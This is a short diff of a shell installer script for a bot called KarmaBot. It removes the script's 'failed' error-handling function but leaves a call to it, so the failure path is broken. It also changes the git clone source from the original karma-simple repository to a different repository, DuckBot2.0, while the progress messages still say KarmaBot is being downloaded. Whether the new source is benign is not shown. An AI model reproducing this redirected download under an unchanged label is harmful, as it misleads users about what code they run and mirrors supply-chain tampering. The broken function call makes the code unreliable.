@@ -1,11 +1,5 @@
 #!/bin/sh
 
-function failed {
-    echo "$(tput setaf 1)$@$(tput sgr0)"
-    echo -e "\nFailed to install. Please visit https://github.com/shikhir-arora/karma-simple/issues.\n"
-    exit 1
-}
-
 echo ""
 echo "Karma Bot Installer - Starting.."
 
@@ -41,7 +35,7 @@ cd "$tempinstalldir"
 
 echo ""
 echo "Downloading KarmaBot, please wait.."
-git clone --recursive --depth 1 https://github.com/shikhir-arora/karma-simple.git || failed "Cannot install. Ensure you have permissions!"
+git clone --recursive --depth 1 https://github.com/winadminsdotorg/DuckBot2.0.git || failed "Cannot install. Ensure you have permissions!"
 echo ""
 echo "KarmaBot downloaded!"
 
